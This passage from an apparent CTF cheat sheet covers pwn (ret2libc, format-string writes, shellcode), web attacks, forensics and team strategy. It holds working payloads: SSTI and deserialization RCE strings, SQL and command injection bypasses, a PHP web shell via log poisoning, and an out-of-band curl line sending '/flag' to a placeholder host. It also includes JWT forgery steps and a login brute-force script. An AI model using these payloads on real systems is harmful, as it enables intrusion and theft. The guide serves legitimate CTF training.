    s.add(flag[i] ^ flag[i+1] == expected[i])
s.add(Sum([ZeroExt(8, c) for c in flag]) == 0x1234)

if s.check() == sat:
    m = s.model()
    print(bytes(m[c].as_long() for c in flag))
```

**Useful Z3 patterns:**

```python
# All solutions
while s.check() == sat:
    m = s.model(); print(m)
    s.add(Or([c != m[c] for c in flag]))

# Arrays / memory
mem = Array('mem', BitVecSort(32), BitVecSort(8))

# Non-linear integer math
x = Int('x'); s.add(x*x + 3*x == 180)

# Floating point
f = FP('f', Float64())

# Optimization (max/min)
o = Optimize(); o.add(...); o.maximize(expr); o.check()
```

### angr — automatic input recovery

```python
import angr, claripy

proj = angr.Project('./chall', auto_load_libs=False)

# Option A: find by address
state = proj.factory.entry_state()
simgr = proj.factory.simulation_manager(state)
simgr.explore(find=0x401234, avoid=[0x401300, 0x401400])
if simgr.found:
    print(simgr.found[0].posix.dumps(0))     # stdin that reaches "find"
```

```python
# Option B: find by output string (no addresses needed)
def is_win(state):
    return b'Correct' in state.posix.dumps(1)
def is_lose(state):
    return b'Wrong' in state.posix.dumps(1)

simgr.explore(find=is_win, avoid=is_lose)
```

```python
# Option C: symbolic argv / fixed-length flag
flag = claripy.BVS('flag', 8*40)
state = proj.factory.entry_state(args=['./chall', flag])
for b in flag.chop(8):
    state.solver.add(b >= 0x20, b <= 0x7e)
```

**angr speed tips:**
- `auto_load_libs=False` always.
- Hook expensive functions (`strlen`, `sleep`, `printf`) with `proj.hook_symbol`.
- Start from a later address with `proj.factory.blank_state(addr=...)` and set up registers/stack yourself.
- Add `state.options.add(angr.options.LAZY_SOLVES)`.
- If it explodes, constrain the flag format and length first.

```python
@proj.hook_symbol('sleep', angr.SIM_PROCEDURES['stubs']['ReturnUnconstrained']())
def nop_sleep(state): return 0
```

### When angr fails

Fall back to: manual Z3 transcription, `ltrace`/`gdb` per-character brute force, or patching the binary to leak the expected value.

---

## 12. Binary exploitation (pwn)

### Protections and what they mean

```bash
checksec --file=chall
```

| Protection | Meaning | Workaround |
|---|---|---|
| NX | No executable stack | ROP / ret2libc |
| Canary | Stack cookie | Leak it, brute force (forking), or overwrite `__stack_chk_fail` GOT |
| PIE | Randomized binary base | Leak a code pointer |
| RELRO Full | GOT read-only | Target `__free_hook` (glibc<2.34), `__malloc_hook`, or FSOP |
| No RELRO / Partial | GOT writable | GOT overwrite |

### Find the offset

```python
from pwn import *
p = process('./chall')
p.sendline(cyclic(400))
p.wait()
core = p.corefile
print(cyclic_find(core.read(core.rsp, 4)))    # 32-bit
print(cyclic_find(core.read(core.rsp, 8)))    # 64-bit
```

```
# In gdb without a core:
pwn cyclic 400
r < pattern.txt
cyclic -l 0x6161616b
```

### ret2win

```python
from pwn import *
elf = context.binary = ELF('./chall')
io = process()
payload = flat({offset: elf.symbols['win']})
io.sendline(payload)
io.interactive()
```

**Stack alignment fix** (common `movaps` crash on remote):

```python
ret = elf.search(asm('ret')).__next__()
payload = flat({offset: [ret, elf.symbols['win']]})
```

### ret2libc (leak then call system)

```python
from pwn import *
elf = context.binary = ELF('./chall')
libc = ELF('./libc.so.6')
io = process()

rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi','ret'])[0]
ret     = rop.find_gadget(['ret'])[0]

# Stage 1: leak puts@GOT
payload = flat({offset: [pop_rdi, elf.got['puts'], elf.plt['puts'], elf.symbols['main']]})
io.sendlineafter(b'> ', payload)
leak = u64(io.recvline().strip().ljust(8, b'\x00'))
libc.address = leak - libc.symbols['puts']
log.success(f'libc base: {hex(libc.address)}')

# Stage 2: system("/bin/sh")
rop2 = ROP(libc)
payload = flat({offset: [ret, pop_rdi, next(libc.search(b'/bin/sh\x00')),
                         libc.symbols['system']]})
io.sendline(payload)
io.interactive()
```

Match the remote libc: `patchelf --set-interpreter ./ld.so --set-rpath . ./chall`, or use `libc-database` / `pwninit`.

### Format string

```python
from pwn import *
# 1) Find the offset of your input on the stack
for i in range(1, 30):
    io = process('./chall')
    io.sendline(f'AAAA.%{i}$p'.encode())
    print(i, io.recvall())
# Look for 0x41414141 -> that's your offset
```

```python
# 2) Arbitrary read
io.sendline(b'%7$s' + p64(target_addr))

# 3) Arbitrary write with pwntools automation
def exec_fmt(payload):
    io = process('./chall'); io.sendline(payload); return io.recvall()
fmt = FmtStr(exec_fmt)
fmt.write(target_addr, value)
fmt.execute_writes()
```

```python
# 4) Leak the whole stack / find libc & canary
io.sendline(b'|'.join(f'%{i}$p'.encode() for i in range(1, 40)))
```

### Heap (glibc)

- **tcache poisoning** (glibc 2.27–2.31): free a chunk, overwrite its `fd` with `target ^ (chunk_addr >> 12)` (safe-linking, ≥2.32), malloc twice → arbitrary write.
- **Double free** → same chunk twice in tcache (needs the key field cleared on ≥2.29).
- **House of Force / Spirit / Botcake / Einherjar** — look up the specific version constraints.
- Always check `libc.version` first; heap techniques are extremely version-specific.

```text
# pwndbg heap inspection
heap, bins, tcachebins, vis_heap_chunks, malloc_chunk 0x...
```

### Shellcode (when NX is off)

```python
from pwn import *
context.arch = 'amd64'
sc = asm(shellcraft.sh())
# or a tiny read-flag shellcode:
sc = asm(shellcraft.cat('/flag'))
payload = sc.ljust(offset, b'\x90') + p64(buffer_addr)
```

### ret2csu / SROP / stack pivot

```python
# Stack pivot when you only control a small overflow
leave_ret = rop.find_gadget(['leave','ret'])[0]
payload = flat({offset: [fake_stack_addr, leave_ret]})

# SROP: one syscall gadget + a fake sigreturn frame
frame = SigreturnFrame()
frame.rax = constants.SYS_execve
frame.rdi = binsh_addr
frame.rip = syscall_addr
```

---

## 13. Web exploitation

### Recon first

```bash
# What is it?
curl -sI http://target/
whatweb http://target/
wappalyzer   # browser extension

# Content discovery
ffuf -u http://target/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -mc 200,301,302,403 -fs 0
gobuster dir -u http://target/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,txt,bak,zip,html
feroxbuster -u http://target/ -x php,html,js,json

# Virtual hosts
ffuf -u http://target/ -H 'Host: FUZZ.target' -w subdomains.txt -fs <default_size>

# Parameters
ffuf -u 'http://target/page?FUZZ=test' -w burp-parameter-names.txt -fs <default_size>
arjun -u http://target/page

# JS files leak endpoints & secrets
curl -s http://target/app.js | grep -Eo '"/[a-zA-Z0-9_/.-]+"' | sort -u
linkfinder.py -i http://target/app.js -o cli

# Always check
/.git/  /.env  /robots.txt  /sitemap.xml  /.DS_Store  /backup.zip
/debug  /admin  /api  /swagger.json  /openapi.json  /graphql  /.well-known/
```

**`.git` exposure:**

```bash
git-dumper http://target/.git/ ./repo
cd repo && git log --oneline && git diff HEAD~1
```

### SQL injection

```
'                        -> error?
' OR 1=1-- -
" OR 1=1-- -
' UNION SELECT NULL-- -
' UNION SELECT NULL,NULL,NULL-- -     (increase until no error)
' UNION SELECT 1,@@version,3-- -
' AND SLEEP(5)-- -                    (time-based)
' AND (SELECT 1 FROM (SELECT SLEEP(5))a)-- -
```

```bash
sqlmap -u 'http://target/item?id=1' --batch --dbs
sqlmap -u 'http://target/item?id=1' --batch -D app -T users --dump
sqlmap -u 'http://target/' --data='user=a&pass=b' --level=5 --risk=3 --batch
sqlmap -r request.txt --batch --tamper=space2comment,between --random-agent
sqlmap -u '...' --os-shell        # if FILE priv / stacked queries
```

**DB-specific payloads:**

| DB | Version | Concat | Comment |
|---|---|---|---|
| MySQL | `@@version` | `CONCAT(a,b)` | `-- -`, `#` |
| Postgres | `version()` | `a\|\|b` | `--` |
| SQLite | `sqlite_version()` | `a\|\|b` | `--` |
| MSSQL | `@@VERSION` | `a+b` | `--` |
| Oracle | `SELECT banner FROM v$version` | `a\|\|b` | `--` |

**SQLite is very common in CTFs** — enumerate with:
`' UNION SELECT name,sql FROM sqlite_master-- -`

**Filter bypasses:** `UnIoN SeLeCt`, `UN/**/ION`, `%55nion`, `||` instead of `OR`, `LIKE` instead of `=`, `CHAR(0x41)` instead of quotes, `0x666c6167` hex literals, `/*!50000UNION*/`.

### NoSQL injection

```json
{"user": {"$ne": null}, "pass": {"$ne": null}}
{"user": {"$regex": "^admin"}, "pass": {"$ne": ""}}
{"$where": "sleep(5000)"}
```

```
user[$ne]=x&pass[$ne]=x
user=admin'||'1'=='1
```

### SSTI (Server-Side Template Injection)

Detect: inject `{{7*7}}` → `49` means Jinja2/Twig. `${7*7}` → `49` means FreeMarker/Velocity/Thymeleaf. `{{7*'7'}}` → `7777777` = Jinja2, `49` = Twig.

```
{{7*7}}  ${7*7}  #{7*7}  <%= 7*7 %>  {{7*'7'}}  {{config}}  {{self}}
```

**Jinja2 RCE:**

```python
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /flag').read() }}
{{ cycler.__init__.__globals__.os.popen('cat /flag').read() }}
{{ lipsum.__globals__["os"].popen("cat /flag").read() }}
{{ get_flashed_messages.__globals__.__builtins__.open("/flag").read() }}
```

**Filter bypass:** `{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')}}`, use `request.args.x` to pass blocked strings, `|attr()` instead of dots, hex escapes for underscores.

**Twig:** `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat /flag")}}`
**Freemarker:** `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("cat /flag")}`
**ERB (Ruby):** `<%= system("cat /flag") %>`
**Pug/Jade:** `- var x = global.process.mainModule.require('child_process').execSync('cat /flag')`

Tool: `tplmap -u 'http://target/?name=x'`

### Command injection

```
; id
| id
|| id
& id
&& id
`id`
$(id)
%0a id
```

**Bypasses:** `ca''t /fla''g`, `cat /fla?`, `cat /fla*`, `c\at`, `${IFS}` for spaces, `cat</flag`, base64: `echo Y2F0IC9mbGFn|base64 -d|sh`, wildcards, `$@`, newline `%0a`.

**Blind:** time-based `; sleep 10`, or out-of-band `; curl http://your-collab/$(cat /flag|base64)`.

### LFI / path traversal / file read

```
?file=../../../../etc/passwd
?file=....//....//....//etc/passwd
?file=..%2f..%2f..%2fetc%2fpasswd
?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd
?file=/etc/passwd%00.png          (PHP < 5.3)
?file=php://filter/convert.base64-encode/resource=index.php
?file=php://filter/read=string.rot13/resource=config.php
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+&c=id
?file=expect://id
?file=/proc/self/environ
?file=/proc/self/cmdline
?file=zip://shell.zip%23shell.php
?file=phar://shell.phar/shell.php
```

**LFI → RCE via log poisoning:** inject `<?php system($_GET['c']); ?>` into the User-Agent, then include `/var/log/nginx/access.log&c=id`.
Also: `/proc/self/fd/N`, PHP session files `/var/lib/php/sessions/sess_<PHPSESSID>`, `pearcmd.php` trick.

### SSRF

```
?url=http://127.0.0.1/admin
?url=http://localhost:8080/
?url=http://[::1]/
?url=http://127.1/
?url=http://2130706433/            (decimal 127.0.0.1)
?url=http://0x7f000001/
?url=http://127.0.0.1.nip.io/
?url=http://metadata.google.internal/computeMetadata/v1/
?url=http://169.254.169.254/latest/meta-data/
?url=gopher://127.0.0.1:6379/_<redis commands>
?url=file:///etc/passwd
?url=dict://127.0.0.1:6379/info
```

Bypass filters with redirects (host your own 302), DNS rebinding, URL parser confusion (`http://expected@evil/`), and `[::]`.

### XXE

```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///flag">]>
<root>&xxe;</root>
```

```xml
<!-- Blind / OOB -->
<!DOCTYPE root [<!ENTITY % dtd SYSTEM "http://you/evil.dtd">%dtd;]>
<!-- PHP base64 to survive binary -->
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/flag">
```

Also try XInclude, SVG uploads, DOCX/XLSX (they're XML zips), and SOAP endpoints.

### JWT attacks

```bash
# Decode
python3 -c "import base64,json,sys; t=sys.argv[1].split('.'); print(json.loads(base64.urlsafe_b64decode(t[0]+'=='))); print(json.loads(base64.urlsafe_b64decode(t[1]+'==')))" TOKEN
```

1. **`alg: none`** — set header `{"alg":"none"}`, strip the signature, keep the trailing dot. Try `none`, `None`, `NONE`, `nOnE`.
2. **Weak HMAC secret** — `hashcat -m 16500 jwt.txt rockyou.txt` or `jwt_tool TOKEN -C -d rockyou.txt`.
3. **RS256 → HS256 confusion** — sign with the *public key* as the HMAC secret.
4. **`kid` injection** — `kid: "../../dev/null"` (sign with empty key) or SQLi in `kid`.
5. **`jku` / `x5u` header** — point to your own JWKS URL.
6. **Expired/`exp` not checked**, `nbf` ignored, claim tampering (`"admin": true`).

```bash
jwt_tool TOKEN -M at -t http://target/api   # scan all known attacks
```

```python
# RS256 -> HS256
import jwt
pub = open('public.pem','rb').read()
print(jwt.encode({"user":"admin"}, key=pub, algorithm="HS256"))
```

### Deserialization

**Python pickle:**

```python
import pickle, os, base64
class E:
    def __reduce__(self):
        return (os.system, ("cat /flag",))
print(base64.b64encode(pickle.dumps(E())))
```

**PHP unserialize:** look for `__wakeup`, `__destruct`, `__toString` → build a POP chain.
`O:4:"User":2:{s:4:"name";s:5:"admin";s:6:"isadmin";b:1;}`
Bypass `__wakeup` with a wrong property count (PHP < 5.6.25). Use `phpggc` for known gadget chains.

**Java:** `ysoserial -f CommonsCollections6 'cat /flag' | base64`. Look for `aced0005` / `rO0AB` magic.

**Node.js:** `node-serialize` IIFE `{"x":"_$$ND_FUNC$$_function(){require('child_process').execSync('cat /flag')}()"}`.

**YAML:** `!!python/object/apply:os.system ["cat /flag"]`.

### File upload bypass

- Extension: `.php5`, `.phtml`, `.phar`, `.pht`, `.php.jpg`, `.php%00.jpg`, `.PhP`, `.php.` , `.php::$DATA`
- Content-Type: set `image/png` while sending PHP
- Magic bytes: prepend `GIF89a;` before `<?php ... ?>`
- `.htaccess` upload: `AddType application/x-httpd-php .jpg`
- Polyglot: valid JPEG + PHP in the EXIF comment
- Race condition: upload then request before the cleanup deletes it
- Path traversal in the filename: `../../var/www/html/shell.php`

### Auth / logic bugs

- Change `POST /api/user/123` → `/api/user/124` (**IDOR**)
- Mass assignment: add `"role":"admin"`, `"is_admin":true`, `"verified":true` to the JSON body
- HTTP verb tampering: `GET` → `POST`/`PUT`/`PATCH`/`OPTIONS`/`HEAD`
- Header spoofing: `X-Forwarded-For: 127.0.0.1`, `X-Original-URL: /admin`, `X-Rewrite-URL`, `Referer`
- Path normalization: `/admin` blocked → `/Admin`, `/admin/`, `//admin`, `/./admin`, `/admin..;/`, `/%2e/admin`
- 403 bypass: `/admin%20`, `/admin%09`, `/admin?`, `/admin#`
- Password reset token: predictable, host-header injection, token reuse, response manipulation
- Race conditions (`race-the-web`, Turbo Intruder): coupon reuse, double withdraw, TOCTOU

```python
# Race with threads
import requests, concurrent.futures
def hit(_): return requests.post(URL, cookies=c, data={'coupon':'X'}).text
with concurrent.futures.ThreadPoolExecutor(30) as ex:
    print(list(ex.map(hit, range(30))))
```

### CORS / CSRF / clickjacking

```
Origin: null
Origin: https://evil.com
Origin: https://target.evil.com
Origin: https://eviltarget.com
```
If `Access-Control-Allow-Origin` reflects your origin **and** `Allow-Credentials: true` → steal authenticated data.

### GraphQL

```graphql
{ __schema { types { name fields { name } } } }
```
Introspection → find hidden mutations. Try aliasing for rate-limit bypass, batching for brute force, and nested queries for DoS.

### Prototype pollution (Node)

```json
{"__proto__": {"isAdmin": true}}
{"constructor": {"prototype": {"isAdmin": true}}}
```
Gadget hunting: look for `Object.assign`, `merge`, `clone`, and template engines → RCE via `__proto__.shell` / `NODE_OPTIONS`.

### Web cheatsheet tools

```bash
# Burp: Proxy -> Repeater -> Intruder -> Turbo Intruder
# Useful extensions: Logger++, Autorize (IDOR), JWT Editor, Param Miner, Hackvertor
mitmproxy -p 8080          # scriptable alternative
```

---

## 14. Forensics, stego, misc

### File carving & metadata

```bash
file mystery
exiftool mystery
binwalk -e mystery            # extract embedded files
foremost -i mystery
strings -n 8 mystery | grep -iE 'flag|ctf\{'
xxd mystery | head -50        # check the magic bytes / header
```

**Fix broken headers:** PNG `89 50 4E 47 0D 0A 1A 0A`, JPEG `FF D8 FF`, ZIP `50 4B 03 04`, GIF `47 49 46 38`, PDF `25 50 44 46`.

```bash
pngcheck -v image.png         # CRC errors -> wrong IHDR height/width
# Fix PNG height in a hex editor, then re-run pngcheck
```

### Image stego

```bash
steghide extract -sf image.jpg -p ''
stegseek image.jpg rockyou.txt        # brute the passphrase (very fast)
zsteg -a image.png                    # LSB in PNG/BMP
stegsolve                             # GUI bit-plane viewer
outguess -r image.jpg out.txt
stegoveritas image.png
```

```python
# LSB extraction
from PIL import Image
im = Image.open('img.png'); px = im.load()
bits = ''.join(str(px[x,y][c] & 1) for y in range(im.height)
               for x in range(im.width) for c in range(3))
print(bytes(int(bits[i:i+8],2) for i in range(0,len(bits)//8*8,8)))
```

### Audio

```bash
sonic-visualiser audio.wav     # look at the SPECTROGRAM — flags are drawn there
audacity                       # spectrogram view, reverse, slow down
sox audio.wav -n spectrogram
# DTMF tones
multimon-ng -t wav -a DTMF audio.wav
# Morse
multimon-ng -t wav -a MORSE_CW audio.wav
# SSTV
qsstv
```

### PCAP

```bash
tshark -r cap.pcap -q -z conv,tcp
tshark -r cap.pcap -Y 'http' -T fields -e http.request.uri
tshark -r cap.pcap -Y 'http.request.method=="POST"' -T fields -e http.file_data
tshark -r cap.pcap --export-objects http,./out
tshark -r cap.pcap -z follow,tcp,ascii,0
# USB keyboard capture
tshark -r cap.pcap -Y 'usb.transfer_type==1 && usb.data_len==8' -T fields -e usb.capdata
```

Wireshark: `Follow → TCP Stream`, `File → Export Objects → HTTP/SMB/TFTP`.
Look for: FTP creds, Telnet, HTTP basic auth, DNS exfil (`*.evil.com` subdomains), ICMP payloads.

### Memory forensics

```bash
vol -f mem.raw windows.info
vol -f mem.raw windows.pslist
vol -f mem.raw windows.cmdline
vol -f mem.raw windows.filescan | grep -i flag
vol -f mem.raw windows.dumpfiles --physaddr 0x...
vol -f mem.raw windows.hashdump
vol -f mem.raw linux.bash
```

### Disk / filesystem

```bash
fls -r disk.img
icat disk.img 12345 > recovered.bin
tsk_recover disk.img ./out
mount -o ro,loop disk.img /mnt
# Deleted git objects
git fsck --lost-found && git show <hash>
```

### Esoteric / misc

```bash
# Brainfuck
python3 -c "import bf; ..."   # or any online offline interpreter
#Whitespace language, Malbolge, Piet (image), Rockstar, Chef -> use dcode.fr
# QR codes
zbarimg qr.png
# Repair a broken QR: fix finder patterns in an image editor
# Zip password
fcrackzip -u -D -p rockyou.txt file.zip
# Classic: nested archives 1000 deep -> script the extraction loop
```

---

## 15. Flag hunting & automation

### Grep everything

```bash
grep -rEoa '[a-zA-Z0-9_]+\{[^}]{1,100}\}' . 2>/dev/null | sort -u
# Common prefixes: flag{ CTF{ HTB{ picoCTF{ THM{DUCTF{ FLAG{
```

```python
import re, pathlib
PAT = re.compile(rb'[A-Za-z0-9_]{2,20}\{[^\x00-\x1f}]{1,200}\}')
for p in pathlib.Path('.').rglob('*'):
    if p.is_file():
        for m in PAT.findall(p.read_bytes()):
            print(p, m.decode(errors='replace'))
```

### Auto-submit

```python
import requests
def submit(flag):
    r = requests.post('https://ctf.example/api/submit',
                      headers={'Authorization': f'Bearer {TOKEN}'},
                      json={'flag': flag})
    print(flag, r.status_code, r.text[:100])
```

### Remote service helper (menu-driven challenges)

```python
from pwn import *
io = remote('host', 1337)
def menu(choice): io.sendlineafter(b'> ', str(choice).encode())
def leak(idx):
    menu(2); io.sendlineafter(b'idx: ', str(idx).encode())
    return io.recvline()
```

### Brute-force templates

```python
# Character-by-character via an oracle
import string
flag = 'flag{'
while not flag.endswith('}'):
    for c in string.printable[:95]:
        if oracle(flag + c):
            flag += c; print(flag); break
    else:
        break
```

```python
# Threaded HTTP brute force
import requests, concurrent.futures
def try_pw(p):
    r = requests.post(URL, data={'user':'admin','pass':p.strip()})
    return p if 'invalid' not in r.text.lower() else None
with concurrent.futures.ThreadPoolExecutor(20) as ex:
    for res in ex.map(try_pw, open('rockyou.txt', errors='ignore')):
        if res: print('FOUND', res); break
```

---

## 16. Strategy for actually winning

**Before the CTF**
- Have the toolbox installed and *tested*. Nothing worse than debugging angr during a competition.
- Prepare template files: `solve.py` (pwntools), `crypto.py` (RSA helpers), `web.py` (requests session).
- Keep a personal notes repo of past solves, indexed by bug class.
- Set up a shared workspace with your team (a git repo + a shared doc).

**During the CTF**
1. **First 15 min:** everyone scans the challenge list, tags categories, and claims the easy ones. Grab all sanity checks / welcome / discord flags immediately.
2. **Score-aware solving:** sort by points ÷ estimated time. A 100-point web misc is worth more per minute than a 500-point heap pwn.
3. **Dynamic scoring:** as others solve a challenge its points drop — but it also becomes *proven solvable*. Watch the solve count.
4. **Time-box:** 45–60 min stuck with zero progress → post your findings in team chat and rotate. Fresh eyes are the single biggest unblocker.
5. **Write down what you've ruled out.** Prevents the team from re-doing the same dead ends.
6. **Read the challenge source when provided.** White-box is always faster than black-box.
7. **Check the obvious twice:** default creds (`admin:admin`), the page source, the comment, the `/robots.txt`, the `.git`, the hint.
8. **Last hour:** stop starting new hard challenges. Finish the ones at 80%.

**Team roles that work**
- One person on web, one on pwn/RE, one on crypto/misc, one floating and doing recon/triage for everyone.
- One person owns the flag-submission log so nothing is lost.

**Common reasons people lose**
- Rabbit-holing on one challenge for 4 hours.
- Not reading the challenge description carefully.
- Fighting their own tooling instead of the challenge.
- Not writing down intermediate results.
- Skipping the "boring" misc challenges that were free points.

---

## 17. Practice resources

| Category | Platform |
|---|---|
| Crypto | CryptoHack, Cryptopals (Sets 1–8) |
| Pwn | pwn.college, ROP Emporium, exploit.education, pwnable.kr, pwnable.tw |
| RE | crackmes.one, Flare-On (past years), reversing.kr |
| Web | PortSwigger Web Security Academy (free, excellent), OWASP Juice Shop, DVWA |
| General | picoCTF (beginner), HTB, TryHackMe, Root-Me, CTFtime writeups |
| Forensics | CyberDefenders, Blue Team Labs, MemLabs |

**Read writeups.** After every CTF, read 3 writeups for challenges you *didn't* solve. That's the fastest skill growth loop that exists.

---

## Quick reference card

```
file / checksec / strings / ltrace / strace     -> RE triage
CyberChef / dcode.fr / quipqiup                 -> encoding & classical
factordb / yafu / Sage                          -> RSA factoring
z3 / angr                                       -> constraint solving
hashcat / john / stegseek                       -> cracking
ffuf / sqlmap / tplmap / Burp                   -> web
pwndbg / ROPgadget / patchelf / pwninit         -> pwn
binwalk / volatility3 / tshark / zsteg          -> forensics
```

**The single most valuable habit:** after each solve, write two sentences — *"the bug was X"* and *"the clue that gave it away was Y."* Do that 200 times and you will pattern-match challenges in minutes.

---

*Offline, no-AI, human-driven. Good luck and have fun.*
